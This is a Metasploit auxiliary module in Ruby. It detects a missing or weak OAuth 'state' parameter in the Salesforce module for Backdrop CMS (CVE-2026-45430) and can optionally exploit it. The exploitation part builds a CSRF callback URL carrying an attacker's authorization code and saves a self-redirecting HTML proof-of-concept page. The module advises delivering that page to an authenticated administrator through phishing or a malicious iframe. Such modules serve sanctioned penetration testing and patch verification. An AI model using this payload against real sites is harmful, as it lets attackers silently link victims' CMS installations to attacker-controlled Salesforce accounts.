##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'Backdrop CMS Salesforce Module OAuth CSRF State Parameter Check',
        'Description'    => %q{
          This module detects and exploits a Cross-Site Request Forgery (CSRF) vulnerability
          in the Salesforce module for Backdrop CMS versions before 1.x-1.0.1
          (CVE-2026-45430, CWE-352).

          The Salesforce module does not generate or validate a cryptographically
          random `state` parameter during the OAuth 2.0 authorization flow.
          An attacker can trick an authenticated administrator into visiting a
          crafted URL, causing their Backdrop CMS installation to be silently
          linked to an attacker-controlled Salesforce account.

          When EXPLOIT is set to true and ATTACKER_CODE is provided, this module
          generates a CSRF payload URL. When delivered to an authenticated Backdrop
          administrator (e.g. via phishing), the payload silently links the target
          CMS to the attacker-controlled Salesforce account by completing the OAuth
          callback without a valid state check.

          Affected versions : Salesforce module < 1.x-1.0.1 for Backdrop CMS
          Fixed in          : Salesforce module 1.x-1.0.1
          Reference         : https://backdropcms.org/security/backdrop-sa-contrib-2026-001
        },
        'Author'         => [
          'Muhammedali Aliyev' # Discovery and Metasploit module
        ],
        'License'        => MSF_LICENSE,
        'References'     => [
          ['CVE', '2026-45430'],
          ['CWE', '352'],
          ['URL', 'https://backdropcms.org/security/backdrop-sa-contrib-2026-001'],
          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2026-45430']
        ],
        'DisclosureDate' => '2026-05-12',
        'Notes'          => {
          'Stability'    => [CRASH_SAFE],
          'Reliability'  => [],
          'SideEffects'  => [NO_ACCOUNT_CREATION, NO_ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI',     [true,  'Base path to Backdrop CMS installation', '/']),
      OptString.new('OAUTH_PATH',    [false, 'Custom path to Salesforce OAuth authorize endpoint',
                                     '/salesforce/oauth/authorize']),
      OptString.new('CALLBACK_PATH', [false, 'Custom path to Salesforce OAuth callback endpoint',
                                     '/salesforce/oauth/callback']),
      OptInt.new('MIN_STATE_LENGTH', [true,  'Minimum acceptable state parameter entropy (chars)', 16]),
      OptBool.new('EXPLOIT',         [false, 'Generate CSRF exploitation payload if target is vulnerable', false]),
      OptString.new('ATTACKER_CODE', [false, 'Attacker-controlled Salesforce OAuth authorization code for CSRF payload', ''])
    ])
  end

  # -----------------------------------------------------------------------
  # Main entry point called once per host by Msf::Auxiliary::Scanner
  # -----------------------------------------------------------------------
  def run_host(ip)
    vprint_status("#{peer} - Starting CVE-2026-45430 check on #{ip}")

    unless backdrop_cms_present?
      print_error("#{peer} - Does not appear to be a Backdrop CMS installation. Skipping.")
      return
    end

    vulnerable = check_oauth_state(ip)

    if vulnerable && datastore['EXPLOIT']
      if datastore['ATTACKER_CODE'].to_s.strip.empty?
        print_warning("#{peer} - EXPLOIT is enabled but ATTACKER_CODE is not set. " \
                      'Set ATTACKER_CODE to your Salesforce OAuth authorization code.')
      else
        generate_csrf_payload(ip)
      end
    end
  end

  # -----------------------------------------------------------------------
  # Heuristic check: is this actually a Backdrop CMS instance?
  # -----------------------------------------------------------------------
  def backdrop_cms_present?
    res = send_request_cgi(
      'method' => 'GET',
      'uri'    => normalize_uri(target_uri.path)
    )

    return false unless res

    # Use get_html_document for proper HTML parsing
    doc     = res.get_html_document
    headers = res.headers.to_s

    # Check meta generator tag via Nokogiri selector
    generator = doc.at_css('meta[name="generator"]')&.[]('content').to_s
    return true if generator.match?(/backdrop/i)

    # Check for Backdrop-specific script sources
    scripts = doc.css('script[src]').map { |s| s['src'].to_s }
    return true if scripts.any? { |s| s.match?(/backdrop\.js/i) }

    # Fallback: full-document string checks
    body_str = doc.to_s
    body_str.match?(/Backdrop CMS/i) ||
      body_str.match?(/sites\/default\/files/i) ||
      headers.match?(/Backdrop CMS/i)
  end

  # -----------------------------------------------------------------------
  # Core vulnerability check -- returns true if target is vulnerable
  # -----------------------------------------------------------------------
  def check_oauth_state(ip)
    oauth_uri = normalize_uri(target_uri.path, datastore['OAUTH_PATH'])

    vprint_status("#{peer} - Requesting OAuth authorize endpoint: #{oauth_uri}")

    res = send_request_cgi(
      'method'         => 'GET',
      'uri'            => oauth_uri,
      'allow_redirect' => false
    )

    unless res
      print_error("#{peer} - No response from OAuth endpoint.")
      return false
    end

    vprint_status("#{peer} - HTTP #{res.code} received")

    case res.code
    when 301, 302, 303, 307, 308
      handle_redirect(ip, res)
    when 200
      handle_body_redirect(ip, res)
    when 403, 404
      print_status("#{peer} - OAuth endpoint returned #{res.code}. " \
                   'Salesforce module may not be installed or is restricted.')
      false
    else
      print_status("#{peer} - Unexpected response code #{res.code}. " \
                   'Cannot determine vulnerability status.')
      false
    end
  end

  # -----------------------------------------------------------------------
  # Handle HTTP 3xx Location header -- returns true if vulnerable
  # -----------------------------------------------------------------------
  def handle_redirect(ip, res)
    location = res.headers['Location'].to_s.strip

    if location.empty?
      print_error("#{peer} - Redirect received but Location header is empty.")
      return false
    end

    vprint_status("#{peer} - Redirect target: #{location}")
    evaluate_state_param(ip, location)
  end

  # -----------------------------------------------------------------------
  # Handle redirect embedded in HTML body (meta-refresh / JS)
  # Returns true if vulnerable
  # -----------------------------------------------------------------------
  def handle_body_redirect(ip, res)
    doc  = res.get_html_document
    body = doc.to_s

    # meta http-equiv="refresh" content="0;url=..."
    meta_match = body.match(/http-equiv=["']refresh["'][^>]*url=([^\s"'>]+)/i)
    # window.location = "..."  or  window.location.href = "..."
    js_match   = body.match(/window\.location(?:\.href)?\s*=\s*["']([^"']+)["']/i)

    location = (meta_match || js_match)&.captures&.first

    if location.nil?
      vprint_status("#{peer} - 200 response but no embedded redirect found. " \
                    'Module may require authentication.')
      return false
    end

    vprint_status("#{peer} - Embedded redirect target: #{location}")
    evaluate_state_param(ip, location)
  end

  # -----------------------------------------------------------------------
  # Parse the redirect URL and evaluate the `state` parameter
  # Returns true if vulnerable, false otherwise
  # -----------------------------------------------------------------------
  def evaluate_state_param(ip, location)
    unless location.include?('salesforce.com') || location.include?('force.com') ||
           location.include?('login.salesforce')
      vprint_status("#{peer} - Redirect does not point to Salesforce. " \
                    'Not an OAuth flow we can evaluate.')
      return false
    end

    begin
      uri    = URI.parse(location)
      params = URI.decode_www_form(uri.query.to_s).to_h
    rescue URI::InvalidURIError => e
      print_error("#{peer} - Could not parse redirect URI: #{e.message}")
      return false
    end

    state   = params['state']
    min_len = datastore['MIN_STATE_LENGTH'].to_i

    if state.nil? || state.strip.empty?
      # ---- VULNERABLE: no state parameter at all ----
      report_and_print_vuln(
        ip,
        'VULNERABLE: No `state` parameter present in OAuth redirect. ' \
        'The authorization flow has no CSRF protection.'
      )
      true

    elsif state.length < min_len
      # ---- LIKELY VULNERABLE: state too short / predictable ----
      report_and_print_vuln(
        ip,
        "LIKELY VULNERABLE: `state` parameter is only #{state.length} character(s) " \
        "(minimum expected: #{min_len}). It may be predictable or static. " \
        "state=#{state}"
      )
      true

    elsif static_state?(state)
      # ---- LIKELY VULNERABLE: state appears non-random ----
      report_and_print_vuln(
        ip,
        "LIKELY VULNERABLE: `state` parameter appears static or non-random. " \
        "state=#{state}"
      )
      true

    else
      # ---- NOT VULNERABLE ----
      print_status(
        "#{peer} - NOT VULNERABLE: `state` parameter present and appears " \
        "sufficiently random (#{state.length} chars). " \
        "Patch may already be applied."
      )
      false
    end
  end

  # -----------------------------------------------------------------------
  # Generate CSRF exploitation payload
  #
  # Attack flow:
  #   1. Attacker completes Salesforce OAuth against their own account,
  #      obtaining a valid authorization `code`.
  #   2. This module crafts the Backdrop CMS callback URL carrying that code.
  #   3. The crafted URL is saved as a loot HTML PoC file.
  #   4. When an authenticated Backdrop admin visits the URL (e.g. via
  #      phishing or malicious iframe), the CMS silently exchanges the
  #      attacker's code for a token -- linking the site to the attacker's
  #      Salesforce account with no CSRF token validation.
  # -----------------------------------------------------------------------
  def generate_csrf_payload(ip)
    attacker_code = Rex::Text.uri_encode(datastore['ATTACKER_CODE'].to_s.strip)
    callback_path = normalize_uri(target_uri.path, datastore['CALLBACK_PATH'])
    proto         = datastore['SSL'] ? 'https' : 'http'
    base_url      = "#{proto}://#{rhost}:#{rport}"
    csrf_url      = "#{base_url}#{callback_path}?code=#{attacker_code}"

    print_good("#{peer} - CSRF Exploitation Payload:")
    print_good("#{peer} -   #{csrf_url}")
    print_good("#{peer} - Deliver this URL to an authenticated Backdrop admin")
    print_good("#{peer} - (e.g. phishing, malicious iframe, or SSRF).")

    poc_html = build_poc_html(csrf_url)
    poc_path = store_loot(
      'csrf.poc',
      'text/html',
      ip,
      poc_html,
      'backdrop_salesforce_csrf_poc.html',
      'CVE-2026-45430 CSRF PoC -- delivers attacker OAuth code to Backdrop callback'
    )

    print_good("#{peer} - CSRF PoC HTML saved to: #{poc_path}")
  end

  # -----------------------------------------------------------------------
  # Build a self-submitting HTML PoC page
  # -----------------------------------------------------------------------
  def build_poc_html(csrf_url)
    # HTML attribute context: encode &, ", <, >
    html_url = csrf_url.gsub('&', '&amp;').gsub('"', '&quot;').gsub('<', '&lt;').gsub('>', '&gt;')
    # JavaScript string context: only escape \\ and "
    js_url   = csrf_url.gsub('\\', '\\\\').gsub('"', '\\"')
    <<~HTML
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <meta http-equiv="refresh" content="0; url=#{html_url}">
        <title>CVE-2026-45430 CSRF PoC</title>
      </head>
      <body>
        <p>Loading...</p>
        <script>window.location.href = "#{js_url}";</script>
      </body>
      </html>
    HTML
  end

  # -----------------------------------------------------------------------
  # Heuristic: does the state look like it was NOT randomly generated?
  # -----------------------------------------------------------------------
  def static_state?(state)
    # Detect obvious non-random values
    static_patterns = [
      /^0+$/,               # all zeros
      /^1+$/,               # all ones
      /^(.)(\1)+$/,         # repeated single character
      /^\d{1,6}$/,          # small integer (timestamp seconds etc.)
      /^(true|false|null|undefined|csrf|state|token)$/i,
      /^[a-f0-9]{1,8}$/i   # very short hex (e.g. PHP session fragment)
    ]

    static_patterns.any? { |pat| state.match?(pat) }
  end

  # -----------------------------------------------------------------------
  # Report vulnerability and print to console
  # -----------------------------------------------------------------------
  def report_and_print_vuln(ip, detail)
    print_good("#{peer} - #{detail}")
    print_good("#{peer} - CVE-2026-45430 | Backdrop CMS Salesforce module CSRF | CVSS 7.1 HIGH")

    report_vuln(
      host:  ip,
      port:  rport,
      proto: 'tcp',
      name:  name,
      info:  detail,
      refs:  references
    )
  end
end
